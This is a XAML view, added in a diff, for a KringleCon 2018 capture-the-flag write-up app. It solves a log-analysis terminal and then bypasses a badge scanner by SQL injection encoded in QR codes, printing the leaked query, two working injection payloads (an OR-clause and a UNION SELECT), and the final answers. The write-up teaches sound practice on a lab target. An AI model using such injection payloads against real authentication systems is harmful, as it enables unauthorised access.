@@ -1,0 +1,355 @@
+﻿<UserControl x:Class="KringleCon2018.Objectives.Objective6View"
+             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+             xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
+             xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
+             xmlns:local="clr-namespace:KringleCon2018.Objectives"
+             xmlns:prism="http://prismlibrary.com/"
+             prism:ViewModelLocator.AutoWireViewModel="True"
+             Foreground="White"
+             mc:Ignorable="d" Background="Black"
+             d:DesignHeight="4000" d:DesignWidth="800">
+    <ScrollViewer Name="Scroller" HorizontalAlignment="Stretch" HorizontalContentAlignment="Center" VerticalAlignment="Stretch" Background="Black">
+        <StackPanel Width="420">
+            <TextBlock Margin="10,10,10,10">
+                <Run FontSize="30" FontWeight="Regular" FontFamily="Sans"  FontStyle="Italic" Text="Difficulty:" />
+                <Canvas SnapsToDevicePixels="True" UseLayoutRounding="True" Height="30" Width="30">
+                <Path Width="550" Height="740" Fill="Red" StrokeLineJoin="Round">
+                    <Path.Data>M104 195q81 -4 159 12.5t135 54.5l21 -33h-67l70 -100q-41 -13 -85.5 -17.5t-89.5 -1.5t-89.5 13t-84.5 28zM114 383l8 16q50 8 100.5 28.5t96.5 50.5l47 -95h-45l40 -63q-57 -9 -115 -3.5t-113 25.5l25 41h-44zM60 229l61 95q60 -19 125 -24.5t126 4.5l18 -29q-62 -37 -132.5 -53t-141.5 -11l12 18h-68zM17 71l40 57q41 -17 89 -26.5t97 -11t97.5 4.5t91.5 20l31 -44h-172v-71h-102v71h-172zM311 496q-42 -30 -87.5 -51t-93.5 -29l74 152q23 -23 46.5 -36t47.5 -12zM178 706l39 9l19 35l23 -38l42 -6l-29 -31l7 -42l-42 21l-42 -19l19 44zM293 533q-25 4 -45 17t-37 33l29 58z</Path.Data>
+                </Path>
+                    <Canvas.RenderTransform>
+                        <TransformGroup>
+                            <ScaleTransform ScaleX="0.05" ScaleY="0.05" CenterX="0" CenterY="0" />
+                            <RotateTransform CenterX="15" CenterY="20" Angle="180" />
+                        </TransformGroup>
+                    </Canvas.RenderTransform>
+                </Canvas>
+                <Canvas SnapsToDevicePixels="True" UseLayoutRounding="True" Height="30" Width="30">
+                <Path Width="550" Height="740" Fill="Red" StrokeLineJoin="Round">
+                    <Path.Data>M104 195q81 -4 159 12.5t135 54.5l21 -33h-67l70 -100q-41 -13 -85.5 -17.5t-89.5 -1.5t-89.5 13t-84.5 28zM114 383l8 16q50 8 100.5 28.5t96.5 50.5l47 -95h-45l40 -63q-57 -9 -115 -3.5t-113 25.5l25 41h-44zM60 229l61 95q60 -19 125 -24.5t126 4.5l18 -29q-62 -37 -132.5 -53t-141.5 -11l12 18h-68zM17 71l40 57q41 -17 89 -26.5t97 -11t97.5 4.5t91.5 20l31 -44h-172v-71h-102v71h-172zM311 496q-42 -30 -87.5 -51t-93.5 -29l74 152q23 -23 46.5 -36t47.5 -12zM178 706l39 9l19 35l23 -38l42 -6l-29 -31l7 -42l-42 21l-42 -19l19 44zM293 533q-25 4 -45 17t-37 33l29 58z</Path.Data>
+                </Path>
+                    <Canvas.RenderTransform>
+                        <TransformGroup>
+                            <ScaleTransform ScaleX="0.05" ScaleY="0.05" CenterX="0" CenterY="0" />
+                            <RotateTransform CenterX="15" CenterY="20" Angle="180" />
+                        </TransformGroup>
+                    </Canvas.RenderTransform>
+                </Canvas>
+                <Canvas SnapsToDevicePixels="True" UseLayoutRounding="True" Height="30" Width="30">
+                <Path Width="550" Height="740" Fill="Red" StrokeLineJoin="Round">
+                    <Path.Data>M104 195q81 -4 159 12.5t135 54.5l21 -33h-67l70 -100q-41 -13 -85.5 -17.5t-89.5 -1.5t-89.5 13t-84.5 28zM114 383l8 16q50 8 100.5 28.5t96.5 50.5l47 -95h-45l40 -63q-57 -9 -115 -3.5t-113 25.5l25 41h-44zM60 229l61 95q60 -19 125 -24.5t126 4.5l18 -29q-62 -37 -132.5 -53t-141.5 -11l12 18h-68zM17 71l40 57q41 -17 89 -26.5t97 -11t97.5 4.5t91.5 20l31 -44h-172v-71h-102v71h-172zM311 496q-42 -30 -87.5 -51t-93.5 -29l74 152q23 -23 46.5 -36t47.5 -12zM178 706l39 9l19 35l23 -38l42 -6l-29 -31l7 -42l-42 21l-42 -19l19 44zM293 533q-25 4 -45 17t-37 33l29 58z</Path.Data>
+                </Path>
+                    <Canvas.RenderTransform>
+                        <TransformGroup>
+                            <ScaleTransform ScaleX="0.05" ScaleY="0.05" CenterX="0" CenterY="0" />
+                            <RotateTransform CenterX="15" CenterY="20" Angle="180" />
+                        </TransformGroup>
+                    </Canvas.RenderTransform>
+                </Canvas>
+                <Canvas SnapsToDevicePixels="True" UseLayoutRounding="True" Height="30" Width="30">
+                <Path Width="550" Height="740" Fill="White" StrokeLineJoin="Round">
+                    <Path.Data>M104 195q81 -4 159 12.5t135 54.5l21 -33h-67l70 -100q-41 -13 -85.5 -17.5t-89.5 -1.5t-89.5 13t-84.5 28zM114 383l8 16q50 8 100.5 28.5t96.5 50.5l47 -95h-45l40 -63q-57 -9 -115 -3.5t-113 25.5l25 41h-44zM60 229l61 95q60 -19 125 -24.5t126 4.5l18 -29q-62 -37 -132.5 -53t-141.5 -11l12 18h-68zM17 71l40 57q41 -17 89 -26.5t97 -11t97.5 4.5t91.5 20l31 -44h-172v-71h-102v71h-172zM311 496q-42 -30 -87.5 -51t-93.5 -29l74 152q23 -23 46.5 -36t47.5 -12zM178 706l39 9l19 35l23 -38l42 -6l-29 -31l7 -42l-42 21l-42 -19l19 44zM293 533q-25 4 -45 17t-37 33l29 58z</Path.Data>
+                </Path>
+                    <Canvas.RenderTransform>
+                        <TransformGroup>
+                            <ScaleTransform ScaleX="0.05" ScaleY="0.05" CenterX="0" CenterY="0" />
+                            <RotateTransform CenterX="15" CenterY="20" Angle="180" />
+                        </TransformGroup>
+                    </Canvas.RenderTransform>
+                </Canvas>
+                <Canvas SnapsToDevicePixels="True" UseLayoutRounding="True" Height="30" Width="30">
+                <Path Width="550" Height="740" Fill="White" StrokeLineJoin="Round">
+                    <Path.Data>M104 195q81 -4 159 12.5t135 54.5l21 -33h-67l70 -100q-41 -13 -85.5 -17.5t-89.5 -1.5t-89.5 13t-84.5 28zM114 383l8 16q50 8 100.5 28.5t96.5 50.5l47 -95h-45l40 -63q-57 -9 -115 -3.5t-113 25.5l25 41h-44zM60 229l61 95q60 -19 125 -24.5t126 4.5l18 -29q-62 -37 -132.5 -53t-141.5 -11l12 18h-68zM17 71l40 57q41 -17 89 -26.5t97 -11t97.5 4.5t91.5 20l31 -44h-172v-71h-102v71h-172zM311 496q-42 -30 -87.5 -51t-93.5 -29l74 152q23 -23 46.5 -36t47.5 -12zM178 706l39 9l19 35l23 -38l42 -6l-29 -31l7 -42l-42 21l-42 -19l19 44zM293 533q-25 4 -45 17t-37 33l29 58z</Path.Data>
+                </Path>
+                    <Canvas.RenderTransform>
+                        <TransformGroup>
+                            <ScaleTransform ScaleX="0.05" ScaleY="0.05" CenterX="0" CenterY="0" />
+                            <RotateTransform CenterX="15" CenterY="20" Angle="180" />
+                        </TransformGroup>
+                    </Canvas.RenderTransform>
+                </Canvas>
+            </TextBlock>
+            <TextBlock FontFamily="Sans"
+                       FontSize="16"
+                       Margin="10,10,10,10"
+                       TextAlignment="Justify"
+                       HorizontalAlignment="Left"
+                       TextWrapping="Wrap" 
+                       Width="400">
+                <Run Text="Bypass the authentication mechanism associated with the room near Pepper Minstix." />
+                <Hyperlink Command="{Binding NavigateCommand}" CommandParameter="https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg">A sample employee badge is available</Hyperlink>.
+                <Run Text="What is the access control number revealed by the door authentication panel?" />
+                <Run FontStyle="Italic" Text="For hints on achieving this objective, please visit Pepper Minstix and help her with the" />
+                <Run FontWeight="Bold" FontStyle="Italic" Text="Yule Log Analysis" />
+                <Run FontStyle="Italic" Text="Cranberry Pi terminal challenge." />
+            </TextBlock>
+            <Border BorderBrush="White" BorderThickness="2">
+                <Grid>
+                    <Grid.ColumnDefinitions>
+                        <ColumnDefinition Width="120" />
+                        <ColumnDefinition Width="*" />
+                    </Grid.ColumnDefinitions>
+                    <Grid.RowDefinitions>
+                        <RowDefinition Height="Auto" />
+                        <RowDefinition Height="Auto" />
+                    </Grid.RowDefinitions>
+                    <Border Grid.Row="0" Grid.Column="0" BorderBrush="White" BorderThickness="2">
+                        <TextBlock FontFamily="Sans" FontWeight="Bold" FontSize="16" Text="Elf" />
+                    </Border>
+                    <Border Grid.Row="0" Grid.Column="1" BorderBrush="White" BorderThickness="2">
+                        <TextBlock FontFamily="Sans" FontWeight="Bold" FontSize="16" Text="CranberyPi Game" />
+                    </Border>
+
+                    <Border Grid.Row="1" Grid.Column="0" BorderBrush="White" BorderThickness="2" VerticalAlignment="Center">
+                        <TextBlock FontFamily="Sans" FontSize="16" TextWrapping="Wrap" Text="Pepper Minstix" />
+                    </Border>
+                    <Border Grid.Row="1" Grid.Column="1" BorderBrush="White" BorderThickness="2">
+                        <TextBlock VerticalAlignment="Center" FontFamily="Sans" FontSize="16">
+                        <Hyperlink Command="{Binding Path=NavigateCommand}" CommandParameter="https://docker.kringlecon.com/?challenge=spray-detect">
+                            Yule Log Analysis
+                        </Hyperlink>
+                        </TextBlock>
+                    </Border>
+                </Grid>
+            </Border>
+            <Border BorderBrush="White" BorderThickness="2">
+                <StackPanel>
+                    <TextBlock FontFamily="Sans"
+                       FontSize="16"
+                       Margin="10,10,10,10"
+                       HorizontalAlignment="Left"
+                       TextWrapping="Wrap" 
+                       Width="400">
+                        <Run>The Pepper Minstix terminal opens directly to the shell with instructions to search a weblog to find the user that was attacked/compromised.</Run>
+                        <Run>When looking at the files in the home directory (</Run>
+                        <Label Style="{StaticResource kbd}">ls -lah</Label>
+                        <Run>) you can see a python script "evtx_dump.py", and a "ho-ho-no.evtx" file.</Run>
+                        <Run>The ho-ho-no.evtx is binary and cannot be access directoy.</Run>
+                        1) <Run>You must call the evtx_dump.py file and pass in the evtx file.</Run>
+                        <Run>Example:</Run><Label Style="{StaticResource kbd}">python ./evtx_dump.py ./ho-ho-no.evtx</Label>.<LineBreak/>
+                        <Run>In doing so, there is way too much data to look through at once.</Run><LineBreak/><LineBreak/>
+                        2) <Run>Run the following command to only look at the last 2000 lines of the dump:</Run>
+                    </TextBlock>
+                    <TextBlock Style="{StaticResource kbd_tb}">python ./evtx_dump.py ./ho-ho-no.evtx | tail -n 2000</TextBlock>
+                    <TextBlock FontFamily="Sans"
+                       FontSize="16"
+                       Margin="10,10,10,10"
+                       HorizontalAlignment="Left"
+                       TextWrapping="Wrap" 
+                       Width="400">
+                        <Run>In the results, you there will be an example Event log you can look at that is similar to this one:</Run>
+                    </TextBlock>
+                    <TextBlock Width="400" Style="{StaticResource kbd_tb}" HorizontalAlignment="Center">
+                    &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;<LineBreak/>
+                       &lt;System&gt;<LineBreak/>
+                            &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot;&gt;&lt;/Provider&gt;<LineBreak/>
+                            &lt;EventID Qualifiers=&quot;&quot;&gt;4776&lt;/EventID&gt;<LineBreak/>
+                            &lt;Version&gt;0&lt;/Version&gt;<LineBreak/>
+                            &lt;Level&gt;0&lt;/Level&gt;<LineBreak/>
+                            &lt;Task&gt;14336&lt;/Task&gt;<LineBreak/>
+                            &lt;Opcode&gt;0&lt;/Opcode&gt;<LineBreak/>
+                            &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt;<LineBreak/>
+                            &lt;TimeCreated SystemTime=&quot;2018-09-10 12:38:04.308641&quot;&gt;&lt;/TimeCreated&gt;<LineBreak/>
+                            &lt;EventRecordID&gt;233875&lt;/EventRecordID&gt;<LineBreak/>
+                            &lt;Correlation ActivityID=&quot;&quot; RelatedActivityID=&quot;&quot;&gt;&lt;/Correlation&gt;<LineBreak/>
+                            &lt;Execution ProcessID=&quot;664&quot; ThreadID=&quot;720&quot;&gt;&lt;/Execution&gt;<LineBreak/>
+                            &lt;Channel&gt;Security&lt;/Channel&gt;<LineBreak/>
+                            &lt;Computer&gt;WIN-KCON-EXCH16.EM.KRINGLECON.COM&lt;/Computer&gt;<LineBreak/>
+                            &lt;Security UserID=&quot;&quot;&gt;&lt;/Security&gt;<LineBreak/>
+                        &lt;/System&gt;<LineBreak/>
+                        &lt;EventData&gt;<LineBreak/>
+                            &lt;Data Name=&quot;PackageName&quot;&gt;MICROSOFT_AUTHENTICATION_PACKAGE_V1_0&lt;/Data&gt;<LineBreak/>
+                            &lt;Data Name=&quot;TargetUserName&quot;&gt;HealthMailboxbe58608d4925422d8e4ea458cfedc612@EM.KRINGLECON.COM&lt;/Data&gt;<LineBreak/>
+                            &lt;Data Name=&quot;Workstation&quot;&gt;WIN-KCON-EXCH16&lt;/Data&gt;<LineBreak/>
+                            &lt;Data Name=&quot;Status&quot;&gt;0x00000000&lt;/Data&gt;<LineBreak/>
+                        &lt;/EventData&gt;<LineBreak/>
+                    &lt;/Event&gt;<LineBreak/>
+                    </TextBlock>
+                    <TextBlock FontFamily="Sans"
+                       FontSize="16"
+                       Margin="10,10,10,10"
+                       HorizontalAlignment="Left"
+                       TextWrapping="Wrap" 
+                       Width="400">
+                        <Run>In this event log, you can see that we need to be searching for "TargetUserName".  This also appears to be a system mailbox account, so we should be able to filter this one out.</Run><LineBreak/><LineBreak/>
+                        <Run>After reviewing and filtering through the logs on the command line, the final command to run is this:</Run>
+                    </TextBlock>
+                    <TextBlock Style="{StaticResource kbd_tb}">python ./evtx_dump.py ./ho-ho-no.evtx | sed '/&lt;Data Name=&quot;TargetUserName&quot;/,/&lt;\/Data&gt;/!d' | grep '@' | awk '!(/HealthMailbox/
+ || /WIN-KCON-EXCH16/)' | uniq -cd | awk -v limit=1 '$1 &gt; limit{print $3}'</TextBlock>
+                    <TextBlock FontFamily="Sans"
+                       FontSize="16"
+                       Margin="10,10,10,10"
+                       HorizontalAlignment="Left"
+                       TextWrapping="Wrap" 
+                       Width="400">
+                        <Run>They sed command is wran to filter the data to results with &lt;Data Name="TargetUserName".  The grep is ran to only filter to targeted mailbox usernames, so users that have '@' in the name for the email addres.</Run>
+                        <Run>Then awk is used to filter out the system account email noise which are mailboxes that contain "HealthMailbox" or "WIN-KCON-EXCH16".</Run>
+                        <Run>Then we grab the unique records using the command</Run> <Label Style="{StaticResource kbd}">uniq -cd</Label>
+                        <Run>. The uniq records are also returning a count of number of times the unique record occurred.</Run>
+                        <Run>The next command 'awk' is used again to filter the count to more than 1 occurence of the unique record.</Run>
+                    </TextBlock>
+                    <TextBlock FontFamily="Sans"
+                       FontSize="16"
+                       Margin="10,10,10,10"
+                       HorizontalAlignment="Left"
+                       TextWrapping="Wrap" 
+                       Width="400">
+                        The command will produce the following result and will contain the answer.
+                    </TextBlock>
+                    <TextBlock Style="{StaticResource kbd_tb}">Name=&quot;TargetUserName&quot;&gt;minty.candycane@EM.KRINGLECON.COM&lt;/Data&gt;</TextBlock>
+                    <TextBlock FontFamily="Sans"
+                               FontSize="16"
+                               Margin="10,10,10,10"
+                               HorizontalAlignment="Left"
+                               Width="400"
+                               TextWrapping="Wrap">
+                        <Run FontWeight="Bold" Text="Answer" />: minty.candycane@EM.KRINGLECON.COM
+                    </TextBlock>
+                </StackPanel>
+            </Border>
+            <Border BorderBrush="White" BorderThickness="2">
+                <StackPanel>
+                    <TextBlock FontFamily="Sans"
+                                       FontSize="16"
+                                       Margin="10,10,10,10"
+                                       HorizontalAlignment="Left"
+                                       TextWrapping="Wrap" 
+                                       Width="400">
+                        <Run>In this objective challenge, you must use Alabaster's badge and manipulate the QRCode to bypass the authentication mechanism.</Run>
+                        <Run>This is Alabaster's sample badge:</Run>
+                    </TextBlock>
+                    <Image Source="{Binding AlabasterBadge}" HorizontalAlignment="Left" Margin="0" Stretch="Fill" />
+                    <TextBlock FontFamily="Sans"
+                                       FontSize="16"
+                                       Margin="10,10,10,10"
+                                       HorizontalAlignment="Left"
+                                       TextWrapping="Wrap" 
+                                       Width="400">
+                        1) <Run>In this challenge, I will be using the following site to generate QR Codes to try and perform a SQL injection (SQLi) with the data stored on a QR code:</Run> <Hyperlink Command="{Binding Navigate Command}" CommandParameter="https://www.the-qrcode-generator.com/">QR Code Generator</Hyperlink>.
+                        <Run>The first command is to generate an error to learn information off of the error message.</Run><LineBreak/><LineBreak/>
+                        <Run>Use the following site for uploading your QR Codes to: </Run>
+                        <Hyperlink Command="{Binding NavigateCommand}" CommandParameter="https://scanomatic.kringlecastle.com/index.html?challenge=qrcode&amp;id=6607b7cf-98c0-4414-aa35-6276845d420b">Scan-O-Matic</Hyperlink><LineBreak/><LineBreak/>
+                        2) <Run>Use the following data to generate a QR code that will try to cause an error in the QR Scanner:</Run>
+                        <Label Style="{StaticResource kbd}">'"&amp;</Label>  This data will produce the following QR Code:<LineBreak/>
+                    </TextBlock>
+                    <Image Source="{Binding QRCode1}" HorizontalAlignment="Left" Margin="0" Stretch="Fill" />
+                    <TextBlock FontFamily="Sans"
+                                       FontSize="16"
+                                       Margin="10,10,10,10"
+                                       HorizontalAlignment="Left"
+                                       TextWrapping="Wrap" 
+                                       Width="400">
+                    3)  <Run>The above QR Code will produce the following error message:</Run><LineBreak/><LineBreak/>
+                        <TextBlock Style="{StaticResource kbd_tb}">{"data":"EXCEPTION AT (LINE 96 \"user_info = query(\"SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1\".format(uid))\"): (1064, u\"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 1' at line 1\")","request":false}</TextBlock><LineBreak/><LineBreak/>
+                        <Run>We want to pay attention to this section of the error message to produce our desired SQLi.  The SQLi will replace the curly brackets below.</Run><LineBreak/><LineBreak/>
+                        <TextBlock Style="{StaticResource kbd_tb}">SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1</TextBlock><LineBreak/><LineBreak/>
+                        <Run>Use the following SQLi to generate a QR Code:</Run><LineBreak/>
+                        <Label Style="{StaticResource kbd}">' OR enabled = 1 AND 'elf' = 'elf</Label><LineBreak/>
+                        <Run>This is what the SQLi looks like in the Scanner SQL Query:</Run><LineBreak/>
+                        <TextBlock Style="{StaticResource kbd_tb}">SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '' OR enabled = 1 AND 'elf' = 'elf' LIMIT 1</TextBlock><LineBreak/><LineBreak/>
+                        <Run>In this SQLi, we use a single quote to close the single quote from the where clause</Run>
+                        <Label Style="{StaticResource kbd}">AND uid='</Label>.
+                        <Run>We then add an additional WHERE clause</Run>, <Label Style="{StaticResource kbd}">OR enabled=1</Label>
+                        <Run>, to make sure we are returning only enabled users from the result set.</Run>
+                        <Run>Finally, we add on to the WHERE clause</Run>, <Label Style="{StaticResource kbd}">AND 'elf' = 'elf</Label>
+                        <Run>, in order to make the SQLi valid to the overall SQL command and not cause any extra filtering to the WHERE clause of the SQLi.</Run>
+                        <Run>We are purposesly leaving off the single quote, because after the injection, the second single quote from </Run>
+                        <Label Style="{StaticResource kbd}">uid='{}'</Label>
+                        <Run>will be what closes our single quote that we left off in our SQLi.</Run>
+                    </TextBlock>
+                    <TextBlock FontFamily="Sans"
+                               FontSize="16"
+                               Margin="10,10,10,10"
+                               HorizontalAlignment="Left"
+                               Width="400"
+                               TextWrapping="Wrap">
+                        <Run FontWeight="Bold" Text="SQLi 1" />: <Label Style="{StaticResource kbd}">' OR enabled = 1 AND 'elf' = 'elf</Label>
+                    </TextBlock>
+                    <TextBlock FontFamily="Sans"
+                               FontSize="16"
+                               Margin="10,10,10,10"
+                               HorizontalAlignment="Left"
+                               Width="400"
+                               TextWrapping="Wrap">
+                        <Run FontWeight="Bold" Text="QRCode 1" /><LineBreak/>
+                    </TextBlock>
+                    <Image Source="{Binding QRCode2}" HorizontalAlignment="Left" Margin="0" Stretch="Fill" />
+                    <TextBlock FontFamily="Sans"
+                                       FontSize="16"
+                                       Margin="10,10,10,10"
+                                       HorizontalAlignment="Left"
+                                       TextWrapping="Wrap" 
+                                       Width="400">
+                        4) <Run>Another SQLi that ended up working was the by simply cancelling out the SQL command to return nothing, and then UNION on fake data that would just return a 1 value for enabled.</Run><LineBreak/><LineBreak/>
+                        <Run>I used the folling SQLi to accept authentication from fake data:</Run><LineBreak/>
+                    </TextBlock>
+                    <TextBlock Style="{StaticResource kbd_tb}">' UNION SELECT 'first','last',1 FROM employees WHERE 'elf'='elf</TextBlock>
+                    <TextBlock FontFamily="Sans"
+                                       FontSize="16"
+                                       Margin="10,10,10,10"
+                                       HorizontalAlignment="Left"
+                                       TextWrapping="Wrap" 
+                                       Width="400">
+                        <Run>This will also bypass the authentication for the QR Scanner.</Run>
+                        <Run>This is what the SQLi command looks like after injected into the SQL query:</Run><LineBreak/><LineBreak/>
+                        <TextBlock Style="{StaticResource kbd_tb}">SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '' UNION SELECT 'first','last',1 FROM employees WHERE 'elf'='elf' LIMIT 1</TextBlock>
+                    </TextBlock>
+                    <TextBlock FontFamily="Sans"
+                               FontSize="16"
+                               Margin="10,10,10,10"
+                               HorizontalAlignment="Left"
+                               Width="400"
+                               TextWrapping="Wrap">
+                        <Run FontWeight="Bold" Text="SQLi 2" />:
+                    </TextBlock>
+                    <TextBlock Style="{StaticResource kbd_tb}">' UNION SELECT 'first','last',1 FROM employees WHERE 'elf'='elf</TextBlock>
+                    <TextBlock FontFamily="Sans"
+                               FontSize="16"
+                               Margin="10,10,10,10"
+                               HorizontalAlignment="Left"
+                               Width="400"
+                               TextWrapping="Wrap">
+                        <Run FontWeight="Bold" Text="QRCode 2" /><LineBreak/>
+                    </TextBlock>
+                    <Image Source="{Binding QRCode3}" HorizontalAlignment="Left" Margin="0" Stretch="Fill" />
+                    <TextBlock FontFamily="Sans"
+                               FontSize="16"
+                               Margin="10,10,10,10"
+                               HorizontalAlignment="Left"
+                               Width="400"
+                               TextWrapping="Wrap">
+                        3) <Run>Add the QR Code to the badge and now we have a new working badge that will bypass the authentication scanner using SQLi.</Run>
+                    </TextBlock>
+                    <Image Source="{Binding FinalQRBadge}" HorizontalAlignment="Left" Margin="0" Stretch="Fill" />
+                    <TextBlock FontFamily="Sans"
+                               FontSize="16"
+                               Margin="10,10,10,10"
+                               HorizontalAlignment="Left"
+                               Width="400"
+                               TextWrapping="Wrap">
+                        4) <Run>When scanning with the new badge, we will get the following result back from the scanner:</Run>
+                    </TextBlock>
+                    <TextBlock HorizontalAlignment="Left" Style="{StaticResource kbd_tb}">{"data":"User Access Granted - Control number 19880715","request":true,"success":{"hash":"55723af8785bd74ff6469ed13ee6f1d8e8b5026ff4bb9762df8cb4e172d3144e","resourceId":"6607b7cf-98c0-4414-aa35-6276845d420b"}}</TextBlock>
+                    <TextBlock FontFamily="Sans"
+                               FontSize="16"
+                               Margin="10,10,10,10"
+                               HorizontalAlignment="Left"
+                               Width="400"
+                               TextWrapping="Wrap">
+                        From this, we can see the Control number returned from the scanner: 19880715.  This is also visible directly on the scanner after using the updated badge.
+                    </TextBlock>
+                    
+                </StackPanel>
+            </Border>
+            <TextBlock FontFamily="Sans"
+                               FontSize="16"
+                               Margin="10,10,10,10"
+                               HorizontalAlignment="Left"
+                               Width="400"
+                               TextWrapping="Wrap">
+                        <Run FontWeight="Bold" Text="Answer" />: 19880715
+            </TextBlock>
+            <TextBlock><LineBreak /></TextBlock>
+        </StackPanel>
+    </ScrollViewer>
+</UserControl>
